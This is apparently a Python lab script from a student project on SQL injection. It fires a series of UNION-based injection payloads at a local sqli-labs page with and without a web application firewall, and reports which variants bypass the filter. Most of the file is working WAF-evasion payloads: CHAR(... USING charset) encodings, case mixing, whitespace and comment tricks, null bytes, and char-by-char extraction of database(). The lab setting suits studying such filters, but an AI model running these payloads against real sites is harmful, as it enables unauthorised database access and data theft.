"""
bypass_lab/test_char_using.py
==============================
CHAR(n,... USING charset) adalah syntax MySQL yang VALID.
Encode marker pakai CHAR() USING — biarkan database() biasa.

SEQSQLI_START = CHAR(83,69,81,83,81,76,73,95,83,84,65,82,84)
SEQSQLI_END   = CHAR(83,69,81,83,81,76,73,95,69,78,68)

Run:
    python3 -m bypass_lab.test_char_using
"""
import sys, time
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
from seqsqli.core.response import classify_response
import requests

PLAIN = "http://localhost:8081/Less-1/"
WAF   = "http://localhost:8888/Less-1/"
FOUND = []

# SEQSQLI_START sebagai CHAR codes
START = "CHAR(83,69,81,83,81,76,73,95,83,84,65,82,84)"
END   = "CHAR(83,69,81,83,81,76,73,95,69,78,68)"
START_U = "CHAR(83,69,81,83,81,76,73,95,83,84,65,82,84 USING utf8)"
END_U   = "CHAR(83,69,81,83,81,76,73,95,69,78,68 USING utf8)"
START_L = "CHAR(83,69,81,83,81,76,73,95,83,84,65,82,84 USING latin1)"
END_L   = "CHAR(83,69,81,83,81,76,73,95,69,78,68 USING latin1)"


def t(label, payload):
    rp = requests.get(PLAIN, params={"id": payload}, timeout=8)
    rw = requests.get(WAF,   params={"id": payload}, timeout=8)

    plain_ok = classify_response(rp.text, rp.status_code, "union",
                                 strict_markers=True) == "SUCCESS"
    waf_ok   = classify_response(rw.text, rw.status_code, "union",
                                 strict_markers=True) == "SUCCESS"
    waf_pass = rw.status_code != 403

    p_tag = "OK" if plain_ok else ("ERR" if "syntax" in rp.text.lower() else "NODATA")
    w_tag = "*** BYPASS ***" if waf_ok else ("PASS(no_data)" if waf_pass else "BLOCK")

    print(f"  plain={p_tag:<8} waf={w_tag:<18} | {label}")
    if waf_ok:
        FOUND.append(("BYPASS", label, payload))
        print(f"    payload: {payload[:100]}")
    elif waf_pass and plain_ok:
        FOUND.append(("NEAR", label, payload))
        print(f"    *** NEAR MISS ***")
    time.sleep(0.3)


print("=" * 65)
print(" CHAR(... USING charset) bypass test")
print("=" * 65)

# ── 1. Baseline: CHAR tanpa USING (blocked biasanya) ─────────────────
print("\n[1] Baseline: CHAR tanpa USING")
t("CHAR no USING",
  f"-1' UNION SELECT database(),{START},{END}-- -")

# ── 2. CHAR + USING utf8 untuk markers ───────────────────────────────
print("\n[2] CHAR(... USING utf8) untuk markers")
t("CHAR USING utf8 markers",
  f"-1' UNION SELECT database(),{START_U},{END_U}-- -")
t("CHAR USING latin1 markers",
  f"-1' UNION SELECT database(),{START_L},{END_L}-- -")
t("CHAR USING binary markers",
  f"-1' UNION SELECT database(),"
  f"CHAR(83,69,81,83,81,76,73,95,83,84,65,82,84 USING binary),"
  f"CHAR(83,69,81,83,81,76,73,95,69,78,68 USING binary)-- -")

# ── 3. Semua kolom pakai CHAR USING ──────────────────────────────────
print("\n[3] Semua kolom pakai CHAR USING")
# 'security' = CHAR(115,101,99,117,114,105,116,121)
t("all cols CHAR USING utf8",
  f"-1' UNION SELECT CHAR(115,101,99,117,114,105,116,121 USING utf8),"
  f"{START_U},{END_U}-- -")

# ── 4. Kombinasi CHAR USING + whitespace/case bypass ─────────────────
print("\n[4] CHAR USING + whitespace combos")
t("CHAR USING + case UNION",
  f"-1' uNiOn sElEcT database(),{START_U},{END_U}-- -")
t("CHAR USING + tab",
  f"-1'\tUNION\tSELECT\tdatabase(),{START_U},{END_U}-- -")
t("CHAR USING + newline",
  f"-1'\nUNION\nSELECT\ndatabase(),{START_U},{END_U}-- -")
t("CHAR USING + null_byte",
  f"-1' UNION SELECT database(),{START_U},{END_U};\x00")
t("CHAR USING + float_noise",
  f"-1'.6e0 UNION SELECT database(),{START_U},{END_U}-- -")
t("CHAR USING + comment split",
  f"-1' UNION/**/SELECT/**/database(),{START_U},{END_U}-- -")

# ── 5. database() juga pakai CHAR encoding ───────────────────────────
print("\n[5] Encode database() via ORD/ASCII + CHAR USING")
# Ambil char per char via CHAR(ORD(...))
t("CHAR ORD substring",
  f"-1' UNION SELECT "
  f"CHAR(ORD(SUBSTR(database(),1,1)),ORD(SUBSTR(database(),2,1)) USING utf8),"
  f"{START_U},{END_U}-- -")

# ── 6. USING utf8 invalid tapi di kolom pertama, markers valid ────────
print("\n[6] Kolom 1 confuse WAF (USING invalid), marker pakai CHAR USING valid")
t("col1 invalid USING, col2/3 CHAR USING",
  f"-1' UNION SELECT database() USING utf8,{START_U},{END_U}-- -")

# ── 7. Mix: USING invalid di akhir payload ───────────────────────────
print("\n[7] Append USING utf8 setelah query yang seharusnya valid")
t("valid query + USING suffix",
  f"-1' UNION SELECT database(),{START},{END} USING utf8-- -")
t("CHAR markers + USING suffix",
  f"-1' UNION SELECT database(),{START_U},{END_U} USING utf8-- -")

# ── Summary ───────────────────────────────────────────────────────────
print("\n" + "=" * 65)
bypasses = [x for x in FOUND if x[0] == "BYPASS"]
nears    = [x for x in FOUND if x[0] == "NEAR"]
print(f" BYPASS: {len(bypasses)}  |  NEAR MISS: {len(nears)}")
for tag, label, p in FOUND:
    print(f"\n  [{tag}] {label}")
    print(f"  {p[:110]}")
